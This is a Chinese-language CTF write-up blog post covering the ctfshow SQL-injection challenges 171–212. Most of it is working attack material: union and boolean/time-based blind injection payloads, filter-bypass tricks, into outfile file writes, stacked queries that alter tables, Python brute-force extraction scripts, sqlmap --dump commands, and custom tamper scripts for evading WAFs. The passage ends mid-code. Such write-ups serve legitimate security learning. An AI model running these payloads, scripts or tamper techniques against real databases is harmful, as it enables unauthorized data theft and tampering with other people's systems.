---
title: ctfshow-sql注入
id: ctfshow-sql注入
date: 2021-08-01 16:33:30
sidebar_position: 4
---

<!-- more -->

之前的都是写在word里，之所以改用md有两个原因：
一方面一些代码格式不是很方便，另一方面发上博客也能偶尔看看

写了8天总算写完了，学到很多



## 171_无过滤

没有任何过滤，直接union注入

```mysql
' union select 1,group_concat(id,0x2b,username,0x2b,password),3 from ctfshow_user where username = 'flag' --+

# 群主的payload：，没必要追求注释，只要保证语句正常返回即可，万能密码也是一样的原理
1' union select 1,password,3 from ctfshow_user where 'a'='a

# 非预期，把所有内容爆出来
1' or 1=1;--+
```

## 172_无过滤

返回逻辑要求不能存在username!=flag，不输出username即可

```mysql
' union select 1,password from ctfshow_user2 where username='flag'--+
```

## 173_无过滤

返回逻辑同172，只是换成了正则：`preg_match('/flag/i', json_encode($ret)`
172的payload可用，也可以用一下函数比如`hex()`、`to_base64()`把字段内容加密再输出

```mysql
' union select id,to_base64(username),hex(password) from ctfshow_user3--+
```

## 174_无过滤

`preg_match('/flag|[0-9]/i', json_encode($ret)`
过滤了flag和数字，有两个思路，一是盲注，二就是用函数`replace`将数字替换再进行输出：

二分法布尔盲注的脚本网上很多（这里要抓包找sql的api，因为不是在当前网站注入的），这里不赘述了

记一下群主的做法：利用replace函数，将数字0-9替换，可以写脚本跑出来

```python
num = {0: "na", 1: "nb", 2: "nc", 3: "nd", 4: "ne", 5: "nf", 6: "ng", 7: "nh", 8: "ni", 9: "nj"}
password = "password"
for i in range(0, 10):
    password = f"replace({password},'{i}','{num[i]}')"
    print(password)
    
# 运行得到：replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,'0','na'),'1','nb'),'2','nc'),'3','nd'),'4','ne'),'5','nf'),'6','ng'),'7','nh'),'8','ni'),'9','nj')
```

注入语句

```mysql
' union select username,password from ctfshow_user4 where username='flag' --+
```

将username倒置（flag->galf）,password加上replace

```mysql
' union select reverse(username),
replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,'0','na'),'1','nb'),'2','nc'),'3','nd'),'4','ne'),'5','nf'),'6','ng'),'7','nh'),'8','ni'),'9','nj')
from ctfshow_user4 where username='flag' --+
```

跑出结果再用脚本替换回去就行![](https://i.loli.net/2021/08/02/jaWkXHZsGDfo6uJ.png)

```python
flag = "ctfshow{bneeaenhnini-nhnieni-nengnfni-bnfnanj-nhabdnfnaningencbnf}"
num = {0: "na", 1: "nb", 2: "nc", 3: "nd", 4: "ne", 5: "nf", 6: "ng", 7: "nh", 8: "ni", 9: "nj"}
for i in range(0, 10):
    flag = flag.replace(str(num[i]), str(i))
print(flag)

# 得到ctfshow{b4eae788-78e8-4658-b509-7abd5086e2b5}
```

## 175_into outfile/dumpfile

`preg_match('/[\x00-\x7f]/i', json_encode($ret)`过滤了0 - 0x7f的ASCII字符
还是两个方法

一是时间盲注，之前没遇到过时间盲注的脚本，记一下脚本

```python
import requests
url = "http://6daebb8d-82a1-4328-b8f6-34a9962b7f1d.challenge.ctf.show:8080/api/v5.php"
result = ''
i = 0

while True:
    i = i + 1
    head = 32
    tail = 127
    while tail > head:
        mid = (head + tail) // 2    # //向下取整即7.5取7，/为浮点数表示法
        payload = "?id=1' and if(ascii(substr((select  password from ctfshow_user5 where username='flag'),{0},1))>{1},sleep(2),0) -- -".format(i, mid)
        # print(url+payload)
        try:
            r = requests.get(url+payload, timeout=0.5)     # 如果0.5秒内返回结果，目标的ascii值小于等于mid，tail移动至中部，对于响应比较慢的网站，timeout应该设置大一点
            tail = mid
        except Exception as e:      # 0.5秒内未返回结果，目标ascii大于中间值，head移动至中部，因为是大于，所以还要加1
            head = mid+1
    if head == 32:        # 如果这一位为空就会出现结束之后head等于32的情况，break退出
        break
    result += chr(head)     # 这里只能为head或者tail而不能为mid，因为mid可能会少一
    print(result)

```

二是利用into outfile 或 dumpfile写入（需要知道路径，且有写入权限）

ps：如果要写shell的话要求secure_file_prive没有具体值（不是NULL）
NULL表示限制导入导出，有值表示只能在该值表示目录导入导出，没有值表示不做限制

那么将查找结果输出到txt文件里，再url访问即可：

```mysql
' union select username,password from ctfshow_user5 where username ='flag' into
outfile '/var/www/html/1.txt'--+

' union select username,password from ctfshow_user5 where username ='flag' into dumpfile '/var/www/html/2.txt'--+
```

![](https://i.loli.net/2021/08/02/Z2IaRsKMFj98cXH.png)



## 176_大小写绕过

```sql
select id,username,password from ctfshow_user where username !='flag' and id = '".$_GET['id']."' limit 1;
```

查询语句中用单引号闭合传入的内容

法1：可以构造闭合爆出全部内容，payload：`' or 'a'='a`
因为and的优先级比or的高，执行完and的语句再执行or的语句，使得where条件的结果为1，即返回select的所有字段，后续基本都可以，但主要目的是学习绕过手段![](https://i.loli.net/2021/08/02/HdObJXKeBAcriwh.png)

法2，fuzz知道过滤了关键词，直接大小写绕过
payload：`' UNion selEcT 1,2,password from ctfshow_user wHeRe username ='flag' --+`



## 177_空格绕过

过滤空格和+
绕过：`/**/`、`()`、`%0d、%0a、%0c、%0b、%a0、%09` 、` 反引号`  ；注释符--+换成%23
payload：`'union/**/select/**/1,2,password/**/from/**/ctfshow_user/**/where/**/username='flag'%23`

## 178_空格绕过

还是过滤空格，并且/**/被过滤掉了，换个方式即可
payload：
`'union(select(1),(2),(password)from(ctfshow_user)where(username='flag'))%23`

## 179_空格绕过

还是过滤空格，/**/，还有诸如%0d、%0a、%09这些，不过%0c还能用，括号也可以

## 180_空格、注释符绕过

注释符%23和+都被过滤了，直接构造闭合`and'a'='a`就行
payload：
`'union%0cselect%0c1,2,password%0cfrom%0cctfshow_user%0cwhere%0cusername='flag'%0cand'a'='a`

还有就是Y4师傅的wp，利用`--%0c-`

因为在sql语句中注释符实际为`-- (空格)`
url中的空格在传输过程中会这样处理：
**末端**的空格会被忽略，**其余**空格会被转义为%20。
而 + 会被解释为空格，同理，这里用--%0c-，%0c被解释为空格即可实现注释的效果

## 181_运算优先and>or

对传入参数进行过滤，可以看到基本的空格绕过手段和select都被过滤掉了，写入文件也被ban

```php
function waf($str){
    return preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select/i', $str);
  }
```

只能是利用之前的and和or的优先级问题构造闭合
payload：`'or(username='flag')or'0`

拼接到注入语句相当于`username !='flag' and id ='' or(username='flag')or'0'`
这里先执行and语句，因为id=''，and结果为0，再执行or语句，最终where的条件为(username='flag')![](https://i.loli.net/2021/08/02/UCpVygcnbB4FsxY.png)

## 182_运算优先and>or

在181基础上过滤了flag，改一下payload：`'or(id=26)or'0`

## 183_盲注

要post传参tablename来查，过滤规则同上，但只会返回用户表的记录总数
写脚本一位一位的爆flag

```python
import requests
import string

strs = string.digits+string.ascii_letters+"-{}"
url = 'http://43433fb8-09a3-43da-98c6-7a431825a5dc.challenge.ctf.show:8080/select-waf.php'
flag = "ctfshow{"

for i in range(9, 50):
    for j in strs:
        data = {"tableName": f"(ctfshow_user)where(substr(pass,{i},1))regexp('{j}')"}
        r = requests.post(url,data=data)
        if r.text.find("$user_count = 1;") > 0:
            flag += j
            print(flag)
            if '}' in flag:
                exit()
            break
```

## 184_盲注join连接查询

```php
preg_match('/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into|where|\x26|\'|\"|union|\`|sleep|benchmark/i', $str);
```

过滤了很多，连单引号双引号都被过滤了，可以用`hex()`、`char()`来绕过
群主的做法是用`joni `连接查询，`on`作为连接条件：

```mysql
tableName=ctfshow_user as a right join ctfshow_user as b on substr(b.pass,1,1)regexp(char(100))
```

还有个做法，因为`select count(*) from ".$_POST['tableName'].";`有聚合语句count()，结合group by：

```mysql
tableName=ctfshow_user group by pass having pass like 0x63746673686f777b25
```

经试验，正确则user_conunt=43![](https://i.loli.net/2021/08/03/DAT37dLikGVnIUo.png)

写脚本：

```python
import requests
import string

strs = string.digits+string.ascii_letters+"-{}"
url = 'http://0f4376ae-777c-4270-9679-3081817f6896.challenge.ctf.show:8080/select-waf.php'
flag = "ctfshow"

for i in range(1, 50):
    for j in strs:
        data = {"tableName": f"ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,{i},1))regexp(char({ord(j)}))"}
        r = requests.post(url, data=data)
        if r.text.find("$user_count = 43;") > 0:
            if chr(k) == '{' or '{' in flag:
                flag += j
                print(flag)
            if '}' in flag:
                print(flag)
                exit()
            break
```

## 185、186_构造数字

利用特性和函数构造数字：
![](https://i.loli.net/2021/08/03/Ew8XclqRMTfbAJB.png)

```php
185：
preg_match('/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\'|\"|union|\`|sleep|benchmark/i', $str);
186：
preg_match('/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\%|\<|\>|\^|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\'|\"|union|\`|sleep|benchmark/i', $str);
```

还过滤了数字，利用上面的方法构造就行，这里就不构造那么多了--只需要逐个+true就是+1了：

```python
import requests

url = 'http://7e9463ac-f05e-454a-9d62-2682c1779e77.challenge.ctf.show:8080/select-waf.php'
flag = "ctfshow"

def mdnum(i):
    num = "true"
    if i == 1:
        return num
    else:
        for i in range(i-1):
            num += "+true"
    return num
for i in range(8, 50):
    for j in range(127):
        if (j >= 48 and j <= 57) or (j >= 97 and j <= 102) or j == 123 or j == 125 or j == 45:
            data = {"tableName": f"ctfshow_user as a right join ctfshow_user as b on substr(b.pass,{mdnum(i)},true)regexp(char({mdnum(j)}))"}
            r = requests.post(url=url, data=data)
            if r.text.find("$user_count = 43;") > 0:
                flag += chr(j)
                print(flag)
                break
```

## 187_md5($str,true)

只有admin能获得flag，重点看password

```php
$password = md5($_POST['password'],true);
```

记一下知识点：![](https://i.loli.net/2021/08/03/C82Ks149QbtlaVR.png)

```php
<?php
    $a = "ffifdyop";
	$b = "129581926211651571912466741651878684928";
	echo md5($a,True);	# 'or'6�]��!r,��b
	echo md5($b,True);	# �T0D��o#��'or'8
```

传入的`ffifdyop`、`129581926211651571912466741651878684928 `
转换成16进制后： `\xc9 \x99 \xe9 \xf9 \xed \x1c`这些只占一位，表示一个字符，且都是乱码或不可见字符，再转码成字符就是`'or'6�]��!r,��b`，拼接到查询语句就构成闭合

```python
select count(*) from ctfshow_user where username = '$username' and password= ''or'6�]��!r,��b'
```

> 在mysql里面，在用作布尔型判断时，以1开头的字符串会被当做整型数。要注意的是这种情况是必须要有单引 号括起来的，比如password=‘xxx’ or ‘1xxxxxxxxx’，那么就相当于password=‘xxx’ or 1 ，也就 相当于password=‘xxx’ or true，所以返回值就是true。当然在我后来测试中发现，不只是1开头，只要 是数字开头都是可以的。 当然如果只有数字的话，就不需要单引号，比如password=‘xxx’ or 1，那么返回值也是true。（xxx指代 任意字符）

![](https://i.loli.net/2021/08/03/6z2jAYSq9OQy4uZ.png)

## 188_弱比较

```php
//拼接sql语句查找指定ID用户
$sql = "select pass from ctfshow_user where username = {$username}";

//用户名检测
if(preg_match('/and|or|select|from|where|union|join|sleep|benchmark|,|\
(|\)|\'|\"/i', $username)){
$ret['msg']='用户名非法';
die(json_encode($ret));
}
//密码检测
if(!is_numeric($password)){
$ret['msg']='密码只能为数字';
die(json_encode($ret));
}
//密码判断
if($row['pass']==intval($password)){
$ret['msg']='登陆成功';
array_push($ret['data'], array('flag'=>$flag));
}
```

对于username：

1. 利用mysql弱比较时，字符串和数字比较，会将字符串变为0再和数字比较，因此可以`username=0`
   ![](https://i.loli.net/2021/08/03/GznXwl6HL3y8RUA.png)
2. 查询语句中`username={$username}`，那么利用逻辑运算`||`有真则真：`username=1||1`

对password应该也是字符串类型，也让它为0就行

```
username=0&password=0
username=1||1&password=0
```

## 189_load_file()结合盲注

```php
  //用户名检测
  if(preg_match('/select|and| |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\x26|\x7c|or|into|from|where|join|sleep|benchmark/i', $username)){
    $ret['msg']='用户名非法';
    die(json_encode($ret));
  }

  //密码检测
  if(!is_numeric($password)){
    $ret['msg']='密码只能为数字';
    die(json_encode($ret));
  }

  //密码判断
  if($row['pass']==$password){
      $ret['msg']='登陆成功';
    }
```

对username过滤更严，改为对password判断，且password只能为数字

题目提示：flag在api/**index**.php文件中，猜测是select load_file(flag.php)读出来，但这里没回显

而用上一题的姿势令username=0会返回密码错误；=1则返回查询失败，说明用户名不存在

应该是bool盲注了，利用if语句和正则regexp（模糊查询也行）来判断：

```sql
if(load_file('/var/www/html/flag.php')regexp({flag}),0,1);
```

```python
import requests
import string

strs = string.digits+string.ascii_letters+"-{}"
url = 'http://73dbae02-c329-4ddd-9e7b-b954004ede2a.challenge.ctf.show:8080/api/index.php'
flag = "ctfshow{"

for i in range(100):
    for j in strs:
        data = {
            "username": "if(load_file('/var/www/html/api/index.php')regexp('{}'),0,1)".format(flag + j),
            "password": 1
        }
        r = requests.post(url=url, data=data)
        if r"\u5bc6\u7801\u9519\u8bef" in r.text:
            flag += j
            print(flag)
            if j == '}':
                exit()
```

## 190_布尔盲注-无过滤

```php
 //拼接sql语句查找指定ID用户
  $sql = "select pass from ctfshow_user where username = '{$username}'";
  //密码检测
  if(!is_numeric($password)){
    $ret['msg']='密码只能为数字';
    die(json_encode($ret));
  }

  //密码判断
  if($row['pass']==$password){
      $ret['msg']='登陆成功';
    }

  //TODO:感觉少了个啥，奇怪
```

无过滤的布尔盲注，直接上脚本：

```python
import requests

url = 'http://702fb55f-5085-4712-8ab1-e2b264ad2222.challenge.ctf.show:8080/api/index.php'
flag = ""
i = 0

while True:
    i = i + 1
    low = 32
    high = 127

    while low < high:
        mid = (low + high) >> 1	
# 右移n位相当于除 2的n次方，
# 我记得先知社区有篇文章细讲了利用位运算sql注入https://xz.aliyun.com/t/9302

        #payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"
        #payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g'"
        payload = "select group_concat(f1ag) from ctfshow_fl0g"

        data = {
            'username': f"' or if(ascii(substr(({payload}),{i},1))>{mid},1,0)='1",
            "password": 1
        }
        r = requests.post(url=url, data=data)
        if "密码错误" in r.json()['msg']:
            low = mid + 1
        else:
            high = mid

    if low != 32:
        flag += chr(low)
    else:
        break
    print(flag)
```

## 191_布尔盲注-ord

```php
if(preg_match('/file|into|ascii/i', $username)){
        $ret['msg']='用户名非法';
        die(json_encode($ret));
    }
```

ban了ascii，换成ord()
（ascii返回最左字符的ascii代码值，ord返回字符串第一个字符的ascii）

```python
import requests

url = 'http://3f664b1d-192a-4d59-955e-907ea9499292.challenge.ctf.show:8080/api/index.php'
flag = ""
i = 0

while True:
    i = i + 1
    low = 32
    high = 127

    while low < high:
        mid = (low + high) >> 1

        #payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"
        #payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g'"
        payload = "select group_concat(f1ag) from ctfshow_fl0g"

        data = {
            'username': f"' or if(ord(substr(({payload}),{i},1))>{mid},1,0)='1",
            "password": 1
        }
        r = requests.post(url=url, data=data)
        if "密码错误" in r.json()['msg']:
            low = mid + 1
        else:
            high = mid

    if low != 32:
        flag += chr(low)
    else:
        break
    print(flag)
```

## 192_布尔盲注-regexp

```php
if(preg_match('/file|into|ascii|ord|hex/i', $username)){
	$ret['msg']='用户名非法';
	die(json_encode($ret));
	}	
```

ord和hex都被过滤了，用regexp正则匹配

```python
import requests
import string

url = 'http://7a536255-869f-4d7f-980b-c66b7fbe47e9.challenge.ctf.show:8080/api/'
strs = string.digits + string.ascii_letters + "-{}"
flag = "ctfshow"

for i in range(8, 48):
    for j in strs:
        data = {
            'username': f"' or if(substr((select group_concat(f1ag) from ctfshow_fl0g),{i},1)regexp('{j}'),1,0) ='1",
            "password": 1
        }
        r = requests.post(url=url, data=data)
        if "密码错误" in r.json()['msg']:
            flag += j
            print(flag)
            if "}" in flag:
                exit()
            break
```

## 193_布尔盲注-过滤substr

substr被ban掉了，不过没差，删掉直接正则就行，还有表名变了

```python
import requests
import string

url = 'http://9b956d86-f269-4b1d-b9a1-9317b41398d7.challenge.ctf.show:8080/api/'
strs = string.digits + string.ascii_letters + "-{}"
flag = "ctfshow"

for i in range(8, 48):
    for j in strs:
        data = {
            'username': f"' or if((select group_concat(f1ag) from ctfshow_flxg)regexp('{flag+j}'),1,0) ='1",
            "password": 1
        }
        r = requests.post(url=url, data=data)
        if "密码错误" in r.json()['msg']:
            flag += j
            print(flag)
            if "}" in flag:
                exit()
            break
```

## 194_布尔盲注-同上

过滤了left和right，这么看上面193也可以用这两函数，不过好像没差啦
用上面的脚本就可以
不过看群里的pdf学习了一下locate()

```
locate(subStr,string) ：函数返回subStr在string中出现的位置，从1开始计数
```

那么payload还可以这样写

```python
' or if(locate(('{flag+j}'),(select group_concat(f1ag) from ctfshow_flxg))=1,1,0) ='1
```



## 195_堆叠注入-update

```php
  //拼接sql语句查找指定ID用户
  $sql = "select pass from ctfshow_user where username = {$username};";

  //密码检测
  if(!is_numeric($password)){
    $ret['msg']='密码只能为数字';
    die(json_encode($ret));
  }

  //密码判断
  if($row['pass']==$password){
      $ret['msg']='登陆成功';
    }

  //TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧
  if(preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\'|\"|select|union|or|and|\x26|\x7c|file|into/i', $username)){
    $ret['msg']='用户名非法';
    die(json_encode($ret));
  }

  if($row[0]==$password){
      $ret['msg']="登陆成功 flag is $flag";
  }
```

空格、and、or都被过滤掉了，堆叠注入，把密码修改后登录就行

```
#xxx此法不通，存在语法错误--
0;update(ctfshow_user)set(pass)=1
1
```

ps:群里有师傅说这个payload打不通，试了一下发现是语法错误，可能当时忘记改wp了哈哈哈~

换成反引号包起来就行

```
0;update(ctfshow_user)set`pass`=1
1
```



## 196_堆叠注入-select

```php
  //TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧
  if(preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\'|\"|select|union|or|and|\x26|\x7c|file|into/i', $username)){
    $ret['msg']='用户名非法';
    die(json_encode($ret));
  }

  if(strlen($username)>16){
    $ret['msg']='用户名不能超过16个字符';
    die(json_encode($ret));
  }

  if($row[0]==$password){
      $ret['msg']="登陆成功 flag is $flag";
  }
```

限定16个字符，试了试感觉行不通；看wp发现ban的是se1ect，不是select；
不过给出的码就是select呀？？直接select构造一个密码就行

```
1;select(1)
1
```

## 197、198_堆叠注入-alter、爆破

```php
if('/\*|\#|\-|\x23|\'|\"|union|or|and|\x26|\x7c|file|into|select|update|set//i', $username))
```

1、这次select是真的被ban了，同样的原理，可以列出表名；

```
1;show tables
ctfshow_user
```

2、其次就是alter修改字段名，然后爆破：
因为flag的返回逻辑是输入等于password，那么把password字段更名，然后把id字段更名为password，再进行爆破应该就能拿到flag了，有点随便注那题的影子。

先构造payload进行改名：

```
1;alter table ctfshow_user change `pass` `xxx` varchar(255);alter table ctfshow_user change `id` `pass` varchar(255);alter table ctfshow_user change `xxx` `id` varchar(255);
```

然后username为0或者admin的十六进制(0x61646d696e)，password用bp从1开始爆破即可

## 199、200_堆叠注入-同上1

括号被过滤掉了，修改字段名需要赋类型varchar(255)，被ban掉了
那还是这招

```
1;show tables
ctfshow_user
```

## 201_sqlmap

接下来就是sqlmap的系统学习啦 相关参数可以看这个[用法 - sqlmap 用户手册中文版 (campfire.ga)](https://sqlmap.campfire.ga/usage)

这题是最基本的流程：
库-》表-》列-》数据

> --user-agent=AGENT  	指定 HTTP User-Agent
>
> --random-agnet			  使用随机的 HTTP User-Agent，从./txt/user-agents.txt获取
>
> --referer=REFERER   	  指定 HTTP Referer，指明该网页是从哪个页面链接过来的
>
> --batch							 从不询问用户输入，使用默认配置

本题会检测user-agent和referer，利用上面参数绕过就行，不过发现user-agent不加也没事，节省长度就不写了
payload：

```shell
1、爆库
py sqlmap.py -u http://b9477a09-1bb8-4e75-a7ed-201a57c5590a.challenge.ctf.show:8080/api/?id=1 --refer http://b9477a09-1bb8-4e75-a7ed-201a57c5590a.challenge.ctf.show:8080/sqlmap.php --dbs --batch
2、爆表
py sqlmap.py -u http://b9477a09-1bb8-4e75-a7ed-201a57c5590a.challenge.ctf.show:8080/api/?id=1 --refer http://b9477a09-1bb8-4e75-a7ed-201a57c5590a.challenge.ctf.show:8080/sqlmap.php -D ctfshow_web --tables --batch
3、爆列
py sqlmap.py -u http://b9477a09-1bb8-4e75-a7ed-201a57c5590a.challenge.ctf.show:8080/api/?id=1 --refer http://b9477a09-1bb8-4e75-a7ed-201a57c5590a.challenge.ctf.show:8080/sqlmap.php -D ctfshow_web -T  ctfshow_user --columns --batch
4、爆数据
py sqlmap.py -u http://b9477a09-1bb8-4e75-a7ed-201a57c5590a.challenge.ctf.show:8080/api/?id=1 --refer http://b9477a09-1bb8-4e75-a7ed-201a57c5590a.challenge.ctf.show:8080/sqlmap.php -D ctfshow_web -T  ctfshow_user -C pass --dump --batch
```

## 202_sqlmap-data

> --data=DATA	 	修改数据的请求方式，使用 POST 发送数据串

改成post请求

```shell
py sqlmap.py -u http://3386d441-c929-43f8-aeb0-fb478d0c777f.challenge.ctf.show:8080/api/ --data="id=1" --refer http://3386d441-c929-43f8-aeb0-fb478d0c777f.challenge.ctf.show:8080/sqlmap.php -D ctfshow_web -T  ctfshow_user -C pass --dump --batch
```

## 203_sqlmap-method

> --method=METHOD 	修改sqlmap的提交方式，强制使用提供的 HTTP 方法（例如PUT）
> PS：使用PUT方式提交，要修改headers为Content-Type: text/plain，否则默认为表单发送，PUT请求接受不到

payload:

```shell
py sqlmap.py -u http://24942463-0326-431d-bcd8-1dafe9449d33.challenge.ctf.show:8080/api/index.php --method=PUT --headers="Content-Type: text/plain" --data="id=1" --refer http://24942463-0326-431d-bcd8-1dafe9449d33.challenge.ctf.show:8080/sqlmap.php -D ctfshow_web -T ctfshow_user -C pass --dump --batch
```

## 204_sqlmap-cookie

> --cookie=COOKIE     指定 HTTP Cookie（例如："PHPSESSID=a8d127e.."）

payload：

```shell
py sqlmap.py -u http://51435123-5e7b-46ff-bfbb-b0fea3dd175a.challenge.ctf.show:8080/api/index.php --method=PUT --headers="Content-Type: text/plain" --data="id=1" --cookie="ctfshow=c4b59d37847b0472a4c708411fc2f1ab;PHPSESSID=ov9jsctv86ikk8akov5mdk4j9j" --refer http://51435123-5e7b-46ff-bfbb-b0fea3dd175a.challenge.ctf.show:8080/sqlmap.php -D ctfshow_web -T ctfshow_user -C pass --dump --batch
```

## 205_sqlmap-safe -URL

> api调用需要鉴权
>
> --safe-url=SAFEURL  		测试过程中可频繁访问且合法的 URL 地址（两次注入测试前访问安全链接的次数）
> 											（译者注：有些网站在你连续多次访问错误地址时会关闭会话连接）
>
> --safe-freq=SAFE..  			每访问两次给定的合法 URL 才发送一次测试请求（两次注入测试前访问安全链接的次数）

bp抓包，可以看到index.php请求前会先请求getToken.php获取token，这里表名换了，踩了坑，后面就都dump全部了

```shell
py sqlmap.py -u http://1c11cde9-8d98-4d88-bed4-40962693ac66.challenge.ctf.show:8080/api/index.php --method=PUT --headers="Content-Type: text/plain" --data="id=1" --refer http://http://1c11cde9-8d98-4d88-bed4-40962693ac66.challenge.ctf.show:8080/sqlmap.php --safe-url=http://1c11cde9-8d98-4d88-bed4-40962693ac66.challenge.ctf.show:8080/api/getToken.php --safe-freq=1 --dump --batch
```

## 206_sqlmap-sql 闭合

> sql需要闭合

这里的注入语句变为括号闭合：$sql = "select id,username,pass from ctfshow_user where id = ('".$id."') limit 0,1;";
但sqlmap会自己判断闭合条件的，正常注就行

```shell
py sqlmap.py -u http://df10675b-a1ac-4ae9-b73b-cc46e0b16d6b.challenge.ctf.show:8080/api/index.php --method=PUT --headers="Content-Type: text/plain" --data="id=1" --refer http://df10675b-a1ac-4ae9-b73b-cc46e0b16d6b.challenge.ctf.show:8080/sqlmap.php --safe-url=http://df10675b-a1ac-4ae9-b73b-cc46e0b16d6b.challenge.ctf.show:8080/api/getToken.php --safe-freq=1 --dump --batch
```

## 207_sqlmap-tamper

> --tamper=TAMPER     用给定脚本修改注入数据
>
>  --identify-waf      针对 WAF/IPS 防护进行彻底的测试，可以用来检测waf,从而选择脚本

一些常用的tamper脚本：
[sqlmap之常用tamper脚本 - mark_0 - 博客园 (cnblogs.com)](https://www.cnblogs.com/mark0/p/12349551.html)

也可以自己写，可以学习一下Y4er师傅的这篇[Sqlmap Tamper 编写 - Y4er的博客](https://y4er.com/post/sqlmap-tamper/)
然后放到sqlmap所在路径的tamper文件夹里就可以引用了

这题过滤了空格，用的脚本是space2comment，用/**/代替空格

```shell
py sqlmap.py -u http://cf101199-be8b-4f6b-b8c6-15a8b6eeb5fd.challenge.ctf.show:8080/api/index.php --method=PUT --headers="Content-Type: text/plain" --data="id=1" --refer http://cf101199-be8b-4f6b-b8c6-15a8b6eeb5fd.challenge.ctf.show:8080/sqlmap.php --safe-url=http://cf101199-be8b-4f6b-b8c6-15a8b6eeb5fd.challenge.ctf.show:8080/api/getToken.php --safe-freq=1 --dump --batch --tamper space2comment
```

## 208_sqlmap-多tamper

> --tamper="tamper/名字,tamper/名字"	使用多个tamper脚本的格式

过滤了空格和select，不过没有区分大小写，再加一个大小写绕过就行

```shell
py sqlmap.py -u http://79ece7b0-60ae-48b1-b7af-920838cd2fcf.challenge.ctf.show:8080/api/index.php --method=PUT --headers="Content-Type: text/plain" --data="id=1" --refer http://79ece7b0-60ae-48b1-b7af-920838cd2fcf.challenge.ctf.show:8080/sqlmap.php --safe-url=http://79ece7b0-60ae-48b1-b7af-920838cd2fcf.challenge.ctf.show:8080/api/getToken.php --safe-freq=1 --dump --batch --tamper="tamper/space2comment.py,tamper/randomcase.py"
```

## 209_sqlmap-修改tamper

```php
//对传入的参数进行了过滤
  function waf($str){
   //TODO 未完工
   return preg_match('/ |\*|\=/', $str);
  }
```

过滤了空格、*、=，=可以like，空格这些可以用括号啥的，不过试了一下一些脚本都不太行，似乎是一部分脚本对数据库有要求
自己改一下，还是看Y4er师傅的这篇[Sqlmap Tamper 编写 - Y4er的博客](https://y4er.com/post/sqlmap-tamper/)
基于space2comment改一下：

```python
from lib.core.compat import xrange
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW

def dependencies():
    pass

def tamper(payload, **kwargs):

    retVal = payload

    if payload:
        retVal = ""
        quote, doublequote, firstspace = False, False, False

        for i in xrange(len(payload)):
            if not firstspace:
                if payload[i].isspace():
                    firstspace = True
                    retVal += chr(0x0a)
                    continue

            elif payload[i] == '\'':
                quote = not quote

            elif payload[i] == '"':
                doublequote = not doublequote

            elif payload[i] == "*":
                retVal += chr(0x31)
                continue

            elif payload[i] == "=":
                retVal += chr(0x0a)+'like'+chr(0x0a)
                continue

            elif payload[i] == " " and not doublequote and not quote:
                retVal += chr(0x0a)
                continue

            retVal += payload[i]

    return retVal
```

然后调用它：

```shell
py sqlmap.py -u http://fed1ef42-7f77-4ee7-8ebc-992abf606109.challenge.ctf.show:8080/api/index.php --method=PUT --headers="Content-Type: text/plain" --data="id=1" --refer http://fed1ef42-7f77-4ee7-8ebc-992abf606109.challenge.ctf.show:8080/sqlmap.php --safe-url=http://fed1ef42-7f77-4ee7-8ebc-992abf606109.challenge.ctf.show:8080/api/getToken.php --safe-freq=1 --dump --batch --tamper="tamper/atemptry.py"
```

## 210_sqlmap-修改tamper

> ```php
> //对查询字符进行解密
>   function decode($id){
>     return strrev(base64_decode(strrev(base64_decode($id))));
>   }
>       
> ```

按照返回逻辑反写就可以了：

```python
from lib.core.compat import xrange
from lib.core.enums import PRIORITY
import base64

__priority__ = PRIORITY.LOW

def dependencies():
    pass

def tamper(payload, **kwargs):

    retVal = payload

    if payload:
        retVal = base64.b64encode(payload[::-1].encode('utf-8'))
        retVal = base64.b64encode(retVal[::-1]).decode('utf-8')
# 字符串在Python内部的表示是unicode编码，因此，在做编码转换时，通常需要以unicode作为中间编码，即先将其他编码的字符串解码（decode）成unicode，再从unicode编码（encode）成另一种编码。
    return retVal

```

```shell
py sqlmap.py -u http://7cd39123-ecc1-4679-b55c-159bf9c71958.challenge.ctf.show:8080/api/index.php --method=PUT --headers="Content-Type: text/plain" --data="id=1" --refer http://7cd39123-ecc1-4679-b55c-159bf9c71958.challenge.ctf.show:8080/sqlmap.php --safe-url=http://7cd39123-ecc1-4679-b55c-159bf9c71958.challenge.ctf.show:8080/api/getToken.php --safe-freq=1 --dump --batch --tamper="tamper/atemptry.py"
```

## 211_sqlmap-修改tamper

> ```php
> //对查询字符进行解密
>   function decode($id){
>     return strrev(base64_decode(strrev(base64_decode($id))));
>   }
> function waf($str){
>     return preg_match('/ /', $str);
> }
> ```

过滤了空格，加上脚本space2comment就行，也可以把bypass加进自己脚本里

```shell
py sqlmap.py -u http://2b438750-b1c4-47b1-9cac-ee6e01b411f0.challenge.ctf.show:8080/api/index.php --method=PUT --headers="Content-Type: text/plain" --data="id=1" --refer http://2b438750-b1c4-47b1-9cac-ee6e01b411f0.challenge.ctf.show:8080/sqlmap.php --safe-url=http://2b438750-b1c4-47b1-9cac-ee6e01b411f0.challenge.ctf.show:8080/api/getToken.php --safe-freq=1 --dump --batch --tamper="tamper/space2comment.py,tamper/atemptry.py"
```

## 212_sqlmap-修改tamper

> ```php
> //对查询字符进行解密
>   function decode($id){
>     return strrev(base64_decode(strrev(base64_decode($id))));
>   }
> function waf($str){
>     return preg_match('/ |\*/', $str);
> }
> 
> ```

过滤了空格和*，之前的脚本就行：

```python
from lib.core.compat import xrange
